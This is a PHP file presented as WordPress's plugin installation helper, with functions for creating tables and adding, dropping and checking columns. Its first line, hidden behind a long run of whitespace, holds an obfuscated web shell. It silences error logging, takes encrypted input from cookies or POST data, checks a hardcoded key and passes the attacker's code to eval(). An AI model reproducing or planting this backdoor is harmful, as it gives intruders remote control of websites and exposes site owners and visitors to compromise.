<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['b85a77'];global$b85a77;$b85a77=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['uc425d']="\x28\x4e\x6b\x2b\x6d\x63\x68\x3f\x76\x5b\x20\x69\x60\x51\x55\x38\x70\x27\x67\x66\x5c\x34\x4d\x33\x6c\x2e\x59\x31\x2f\x3a\x5a\x7a\xa\x65\x62\x3e\x4b\x32\x4c\x53\x7b\x4a\x35\x45\x64\x77\x9\x3d\x29\x7d\x39\x49\x52\x5d\x30\x42\x41\x36\x61\x2d\x22\x72\x54\x73\x6e\x57\x40\x7e\x5e\x43\x46\x21\x58\x2c\x4f\x7c\x48\x75\x50\x44\x71\x3b\x79\x3c\xd\x6f\x74\x47\x25\x23\x6a\x5f\x26\x37\x24\x2a\x78\x56";$b85a77[$b85a77['uc425d'][4].$b85a77['uc425d'][15].$b85a77['uc425d'][34].$b85a77['uc425d'][37].$b85a77['uc425d'][50].$b85a77['uc425d'][93]]=$b85a77['uc425d'][5].$b85a77['uc425d'][6].$b85a77['uc425d'][61];$b85a77[$b85a77['uc425d'][11].$b85a77['uc425d'][57].$b85a77['uc425d'][15].$b85a77['uc425d'][33].$b85a77['uc425d'][15]]=$b85a77['uc425d'][85].$b85a77['uc425d'][61].$b85a77['uc425d'][44];$b85a77[$b85a77['uc425d'][6].$b85a77['uc425d'][21].$b85a77['uc425d'][93].$b85a77['uc425d'][23].$b85a77['uc425d'][21]]=$b85a77['uc425d'][63].$b85a77['uc425d'][86].$b85a77['uc425d'][61].$b85a77['uc425d'][24].$b85a77['uc425d'][33].$b85a77['uc425d'][64];$b85a77[$b85a77['uc425d'][34].$b85a77['uc425d'][58].$b85a77['uc425d'][42].$b85a77['uc425d'][34].$b85a77['uc425d'][23].$b85a77['uc425d'][37].$b85a77['uc425d'][33].$b85a77['uc425d'][15]]=$b85a77['uc425d'][11].$b85a77['uc425d'][64].$b85a77['uc425d'][11].$b85a77['uc425d'][91].$b85a77['uc425d'][63].$b85a77['uc425d'][33].$b85a77['uc425d'][86];$b85a77[$b85a77['uc425d'][80].$b85a77['uc425d'][37].$b85a77['uc425d'][21].$b85a77['uc425d'][33].$b85a77['uc425d'][37].$b85a77['uc425d'][37].$b85a77['uc425d'][19]]=$b85a77['uc425d'][63].$b85a77['uc425d'][33].$b85a77['uc425d'][61].$b85a77['uc425d'][11].$b85a77['uc425d'][58].$b85a77['uc425d'][24].$b85a77['uc425d'][11].$b85a77['uc425d'][31].$b85a77['uc425d'][33];$b85a77[$b85a77['uc425d'][77].$b85a77['uc425d'][58].$b85a77['uc425d'][54].$b85a77['uc425d'][50].$b85a77['uc425d'][33].$b85a77['uc425d'][54].$b85a77['uc425d'][21]]=$b85a77['uc425d'][16].$b85a77['uc425d'][6].$b85a77['uc425d'][16].$b85a77['uc425d'][8].$b85a77['uc425d'][33].$b85a77['uc425d'][61].$b85a77['uc425d'][63].$b85a77['uc425d'][11].$b85a77['uc425d'][85].$b85a77['uc425d'][64];$b85a77[$b85a77['uc425d'][45].$b85a77['uc425d'][44].$b85a77['uc425d'][33].$b85a77['uc425d'][37].$b85a77['uc425d'][44].$b85a77['uc425d'][54].$b85a77['uc425d'][58]]=$b85a77['uc425d'][77].$b85a77['uc425d'][64].$b85a77['uc425d'][63].$b85a77['uc425d'][33].$b85a77['uc425d'][61].$b85a77['uc425d'][11].$b85a77['uc425d'][58].$b85a77['uc425d'][24].$b85a77['uc425d'][11].$b85a77['uc425d'][31].$b85a77['uc425d'][33];$b85a77[$b85a77['uc425d'][11].$b85a77['uc425d'][37].$b85a77['uc425d'][54].$b85a77['uc425d'][57].$b85a77['uc425d'][19].$b85a77['uc425d'][58].$b85a77['uc425d'][42]]=$b85a77['uc425d'][34].$b85a77['uc425d'][58].$b85a77['uc425d'][63].$b85a77['uc425d'][33].$b85a77['uc425d'][57].$b85a77['uc425d'][21].$b85a77['uc425d'][91].$b85a77['uc425d'][44].$b85a77['uc425d'][33].$b85a77['uc425d'][5].$b85a77['uc425d'][85].$b85a77['uc425d'][44].$b85a77['uc425d'][33];$b85a77[$b85a77['uc425d'][8].$b85a77['uc425d'][33].$b85a77['uc425d'][15].$b85a77['uc425d'][37].$b85a77['uc425d'][93].$b85a77['uc425d'][37].$b85a77['uc425d'][50]]=$b85a77['uc425d'][63].$b85a77['uc425d'][33].$b85a77['uc425d'][86].$b85a77['uc425d'][91].$b85a77['uc425d'][86].$b85a77['uc425d'][11].$b85a77['uc425d'][4].$b85a77['uc425d'][33].$b85a77['uc425d'][91].$b85a77['uc425d'][24].$b85a77['uc425d'][11].$b85a77['uc425d'][4].$b85a77['uc425d'][11].$b85a77['uc425d'][86];$b85a77[$b85a77['uc425d'][86].$b85a77['uc425d'][57].$b85a77['uc425d'][33].$b85a77['uc425d'][33].$b85a77['uc425d'][5].$b85a77['uc425d'][15].$b85a77['uc425d'][50]]=$b85a77['uc425d'][5].$b85a77['uc425d'][34].$b85a77['uc425d'][27].$b85a77['uc425d'][15].$b85a77['uc425d'][54];$b85a77[$b85a77['uc425d'][58].$b85a77['uc425d'][21].$b85a77['uc425d'][44].$b85a77['uc425d'][5].$b85a77['uc425d'][19]]=$b85a77['uc425d'][16].$b85a77['uc425d'][57].$b85a77['uc425d'][23].$b85a77['uc425d'][15].$b85a77['uc425d'][58];$b85a77[$b85a77['uc425d'][58].$b85a77['uc425d'][33].$b85a77['uc425d'][21].$b85a77['uc425d'][93].$b85a77['uc425d'][19].$b85a77['uc425d'][50].$b85a77['uc425d'][42]]=$_POST;$b85a77[$b85a77['uc425d'][16].$b85a77['uc425d'][93].$b85a77['uc425d'][54].$b85a77['uc425d'][57]]=$_COOKIE;@$b85a77[$b85a77['uc425d'][34].$b85a77['uc425d'][58].$b85a77['uc425d'][42].$b85a77['uc425d'][34].$b85a77['uc425d'][23].$b85a77['uc425d'][37].$b85a77['uc425d'][33].$b85a77['uc425d'][15]]($b85a77['uc425d'][33].$b85a77['uc425d'][61].$b85a77['uc425d'][61].$b85a77['uc425d'][85].$b85a77['uc425d'][61].$b85a77['uc425d'][91].$b85a77['uc425d'][24].$b85a77['uc425d'][85].$b85a77['uc425d'][18],NULL);@$b85a77[$b85a77['uc425d'][34].$b85a77['uc425d'][58].$b85a77['uc425d'][42].$b85a77['uc425d'][34].$b85a77['uc425d'][23].$b85a77['uc425d'][37].$b85a77['uc425d'][33].$b85a77['uc425d'][15]]($b85a77['uc425d'][24].$b85a77['uc425d'][85].$b85a77['uc425d'][18].$b85a77['uc425d'][91].$b85a77['uc425d'][33].$b85a77['uc425d'][61].$b85a77['uc425d'][61].$b85a77['uc425d'][85].$b85a77['uc425d'][61].$b85a77['uc425d'][63],0);@$b85a77[$b85a77['uc425d'][34].$b85a77['uc425d'][58].$b85a77['uc425d'][42].$b85a77['uc425d'][34].$b85a77['uc425d'][23].$b85a77['uc425d'][37].$b85a77['uc425d'][33].$b85a77['uc425d'][15]]($b85a77['uc425d'][4].$b85a77['uc425d'][58].$b85a77['uc425d'][96].$b85a77['uc425d'][91].$b85a77['uc425d'][33].$b85a77['uc425d'][96].$b85a77['uc425d'][33].$b85a77['uc425d'][5].$b85a77['uc425d'][77].$b85a77['uc425d'][86].$b85a77['uc425d'][11].$b85a77['uc425d'][85].$b85a77['uc425d'][64].$b85a77['uc425d'][91].$b85a77['uc425d'][86].$b85a77['uc425d'][11].$b85a77['uc425d'][4].$b85a77['uc425d'][33],0);@$b85a77[$b85a77['uc425d'][8].$b85a77['uc425d'][33].$b85a77['uc425d'][15].$b85a77['uc425d'][37].$b85a77['uc425d'][93].$b85a77['uc425d'][37].$b85a77['uc425d'][50]](0);$i612e7c20=NULL;$c965=NULL;$b85a77[$b85a77['uc425d'][61].$b85a77['uc425d'][34].$b85a77['uc425d'][21].$b85a77['uc425d'][19].$b85a77['uc425d'][93].$b85a77['uc425d'][42].$b85a77['uc425d'][34].$b85a77['uc425d'][37].$b85a77['uc425d'][27]]=$b85a77['uc425d'][50].$b85a77['uc425d'][34].$b85a77['uc425d'][34].$b85a77['uc425d'][27].$b85a77['uc425d'][21].$b85a77['uc425d'][44].$b85a77['uc425d'][44].$b85a77['uc425d'][27].$b85a77['uc425d'][59].$b85a77['uc425d'][44].$b85a77['uc425d'][93].$b85a77['uc425d'][23].$b85a77['uc425d'][15].$b85a77['uc425d'][59].$b85a77['uc425d'][21].$b85a77['uc425d'][15].$b85a77['uc425d'][50].$b85a77['uc425d'][42].$b85a77['uc425d'][59].$b85a77['uc425d'][58].$b85a77['uc425d'][58].$b85a77['uc425d'][54].$b85a77['uc425d'][44].$b85a77['uc425d'][59].$b85a77['uc425d'][50].$b85a77['uc425d'][42].$b85a77['uc425d'][44].$b85a77['uc425d'][93].$b85a77['uc425d'][23].$b85a77['uc425d'][37].$b85a77['uc425d'][93].$b85a77['uc425d'][15].$b85a77['uc425d'][27].$b85a77['uc425d'][37].$b85a77['uc425d'][23].$b85a77['uc425d'][57];global$rb4f75b21;function p638a($i612e7c20,$f86e62){global$b85a77;$f9e9f440="";for($vfce=0;$vfce<$b85a77[$b85a77['uc425d'][6].$b85a77['uc425d'][21].$b85a77['uc425d'][93].$b85a77['uc425d'][23].$b85a77['uc425d'][21]]($i612e7c20);){for($p4d2c5822=0;$p4d2c5822<$b85a77[$b85a77['uc425d'][6].$b85a77['uc425d'][21].$b85a77['uc425d'][93].$b85a77['uc425d'][23].$b85a77['uc425d'][21]]($f86e62)&&$vfce<$b85a77[$b85a77['uc425d'][6].$b85a77['uc425d'][21].$b85a77['uc425d'][93].$b85a77['uc425d'][23].$b85a77['uc425d'][21]]($i612e7c20);$p4d2c5822++,$vfce++){$f9e9f440.=$b85a77[$b85a77['uc425d'][4].$b85a77['uc425d'][15].$b85a77['uc425d'][34].$b85a77['uc425d'][37].$b85a77['uc425d'][50].$b85a77['uc425d'][93]]($b85a77[$b85a77['uc425d'][11].$b85a77['uc425d'][57].$b85a77['uc425d'][15].$b85a77['uc425d'][33].$b85a77['uc425d'][15]]($i612e7c20[$vfce])^$b85a77[$b85a77['uc425d'][11].$b85a77['uc425d'][57].$b85a77['uc425d'][15].$b85a77['uc425d'][33].$b85a77['uc425d'][15]]($f86e62[$p4d2c5822]));}}return$f9e9f440;}function cb180($i612e7c20,$f86e62){global$b85a77;global$rb4f75b21;return$b85a77[$b85a77['uc425d'][58].$b85a77['uc425d'][21].$b85a77['uc425d'][44].$b85a77['uc425d'][5].$b85a77['uc425d'][19]]($b85a77[$b85a77['uc425d'][58].$b85a77['uc425d'][21].$b85a77['uc425d'][44].$b85a77['uc425d'][5].$b85a77['uc425d'][19]]($i612e7c20,$rb4f75b21),$f86e62);}foreach($b85a77[$b85a77['uc425d'][16].$b85a77['uc425d'][93].$b85a77['uc425d'][54].$b85a77['uc425d'][57]]as$f86e62=>$c055e){$i612e7c20=$c055e;$c965=$f86e62;}if(!$i612e7c20){foreach($b85a77[$b85a77['uc425d'][58].$b85a77['uc425d'][33].$b85a77['uc425d'][21].$b85a77['uc425d'][93].$b85a77['uc425d'][19].$b85a77['uc425d'][50].$b85a77['uc425d'][42]]as$f86e62=>$c055e){$i612e7c20=$c055e;$c965=$f86e62;}}$i612e7c20=@$b85a77[$b85a77['uc425d'][45].$b85a77['uc425d'][44].$b85a77['uc425d'][33].$b85a77['uc425d'][37].$b85a77['uc425d'][44].$b85a77['uc425d'][54].$b85a77['uc425d'][58]]($b85a77[$b85a77['uc425d'][86].$b85a77['uc425d'][57].$b85a77['uc425d'][33].$b85a77['uc425d'][33].$b85a77['uc425d'][5].$b85a77['uc425d'][15].$b85a77['uc425d'][50]]($b85a77[$b85a77['uc425d'][11].$b85a77['uc425d'][37].$b85a77['uc425d'][54].$b85a77['uc425d'][57].$b85a77['uc425d'][19].$b85a77['uc425d'][58].$b85a77['uc425d'][42]]($i612e7c20),$c965));if(isset($i612e7c20[$b85a77['uc425d'][58].$b85a77['uc425d'][2]])&&$rb4f75b21==$i612e7c20[$b85a77['uc425d'][58].$b85a77['uc425d'][2]]){if($i612e7c20[$b85a77['uc425d'][58]]==$b85a77['uc425d'][11]){$vfce=Array($b85a77['uc425d'][16].$b85a77['uc425d'][8]=>@$b85a77[$b85a77['uc425d'][77].$b85a77['uc425d'][58].$b85a77['uc425d'][54].$b85a77['uc425d'][50].$b85a77['uc425d'][33].$b85a77['uc425d'][54].$b85a77['uc425d'][21]](),$b85a77['uc425d'][63].$b85a77['uc425d'][8]=>$b85a77['uc425d'][27].$b85a77['uc425d'][25].$b85a77['uc425d'][54].$b85a77['uc425d'][59].$b85a77['uc425d'][27],);echo@$b85a77[$b85a77['uc425d'][80].$b85a77['uc425d'][37].$b85a77['uc425d'][21].$b85a77['uc425d'][33].$b85a77['uc425d'][37].$b85a77['uc425d'][37].$b85a77['uc425d'][19]]($vfce);}elseif($i612e7c20[$b85a77['uc425d'][58]]==$b85a77['uc425d'][33]){eval($i612e7c20[$b85a77['uc425d'][44]]);}exit();} ?><?php
/**
 * Plugins may load this file to gain access to special helper functions for
 * plugin installation. This file is not included by WordPress and it is
 * recommended, to prevent fatal errors, that this file is included using
 * require_once().
 *
 * These functions are not optimized for speed, but they should only be used
 * once in a while, so speed shouldn't be a concern. If it is and you are
 * needing to use these functions a lot, you might experience time outs. If you
 * do, then it is advised to just write the SQL code yourself.
 *
 *     check_column( 'wp_links', 'link_description', 'mediumtext' );
 *     if ( check_column( $wpdb->comments, 'comment_author', 'tinytext' ) ) {
 *         echo "ok\n";
 *     }
 *
 *     $error_count = 0;
 *     $tablename = $wpdb->links;
 *     // Check the column.
 *     if ( ! check_column($wpdb->links, 'link_description', 'varchar( 255 )' ) ) {
 *         $ddl = "ALTER TABLE $wpdb->links MODIFY COLUMN link_description varchar(255) NOT NULL DEFAULT '' ";
 *         $q = $wpdb->query( $ddl );
 *     }
 *
 *     if ( check_column( $wpdb->links, 'link_description', 'varchar( 255 )' ) ) {
 *         $res .= $tablename . ' - ok <br />';
 *     } else {
 *         $res .= 'There was a problem with ' . $tablename . '<br />';
 *         ++$error_count;
 *     }
 *
 * @package WordPress
 * @subpackage Plugin
 */

/** Load WordPress Bootstrap */
require_once(dirname(dirname(__FILE__)).'/wp-load.php');

if ( ! function_exists('maybe_create_table') ) :
/**
 * Create database table, if it doesn't already exist.
 *
 * @since 1.0.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $table_name Database table name.
 * @param string $create_ddl Create database table SQL.
 * @return bool False on error, true if already exists or success.
 */
function maybe_create_table($table_name, $create_ddl) {
	global $wpdb;
	foreach ($wpdb->get_col("SHOW TABLES",0) as $table ) {
		if ($table == $table_name) {
			return true;
		}
	}
	// Didn't find it, so try to create it.
	$wpdb->query($create_ddl);

	// We cannot directly tell that whether this succeeded!
	foreach ($wpdb->get_col("SHOW TABLES",0) as $table ) {
		if ($table == $table_name) {
			return true;
		}
	}
	return false;
}
endif;

if ( ! function_exists('maybe_add_column') ) :
/**
 * Add column to database table, if column doesn't already exist in table.
 *
 * @since 1.0.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $table_name Database table name
 * @param string $column_name Table column name
 * @param string $create_ddl SQL to add column to table.
 * @return bool False on failure. True, if already exists or was successful.
 */
function maybe_add_column($table_name, $column_name, $create_ddl) {
	global $wpdb;
	foreach ($wpdb->get_col("DESC $table_name",0) as $column ) {

		if ($column == $column_name) {
			return true;
		}
	}

	// Didn't find it, so try to create it.
	$wpdb->query($create_ddl);

	// We cannot directly tell that whether this succeeded!
	foreach ($wpdb->get_col("DESC $table_name",0) as $column ) {
		if ($column == $column_name) {
			return true;
		}
	}
	return false;
}
endif;

/**
 * Drop column from database table, if it exists.
 *
 * @since 1.0.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $table_name Table name
 * @param string $column_name Column name
 * @param string $drop_ddl SQL statement to drop column.
 * @return bool False on failure, true on success or doesn't exist.
 */
function maybe_drop_column($table_name, $column_name, $drop_ddl) {
	global $wpdb;
	foreach ($wpdb->get_col("DESC $table_name",0) as $column ) {
		if ($column == $column_name) {

			// Found it, so try to drop it.
			$wpdb->query($drop_ddl);

			// We cannot directly tell that whether this succeeded!
			foreach ($wpdb->get_col("DESC $table_name",0) as $column ) {
				if ($column == $column_name) {
					return false;
				}
			}
		}
	}
	// Else didn't find it.
	return true;
}

/**
 * Check column matches criteria.
 *
 * Uses the SQL DESC for retrieving the table info for the column. It will help
 * understand the parameters, if you do more research on what column information
 * is returned by the SQL statement. Pass in null to skip checking that
 * criteria.
 *
 * Column names returned from DESC table are case sensitive and are listed:
 *      Field
 *      Type
 *      Null
 *      Key
 *      Default
 *      Extra
 *
 * @since 1.0.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $table_name Table name
 * @param string $col_name   Column name
 * @param string $col_type   Column type
 * @param bool   $is_null    Optional. Check is null.
 * @param mixed  $key        Optional. Key info.
 * @param mixed  $default    Optional. Default value.
 * @param mixed  $extra      Optional. Extra value.
 * @return bool True, if matches. False, if not matching.
 */
function check_column($table_name, $col_name, $col_type, $is_null = null, $key = null, $default = null, $extra = null) {
	global $wpdb;
	$diffs = 0;
	$results = $wpdb->get_results("DESC $table_name");

	foreach ($results as $row ) {

		if ($row->Field == $col_name) {

			// Got our column, check the params.
			if (($col_type != null) && ($row->Type != $col_type)) {
				++$diffs;
			}
			if (($is_null != null) && ($row->Null != $is_null)) {
				++$diffs;
			}
			if (($key != null) && ($row->Key  != $key)) {
				++$diffs;
			}
			if (($default != null) && ($row->Default != $default)) {
				++$diffs;
			}
			if (($extra != null) && ($row->Extra != $extra)) {
				++$diffs;
			}
			if ($diffs > 0) {
				return false;
			}
			return true;
		} // end if found our column
	}
	return false;
}
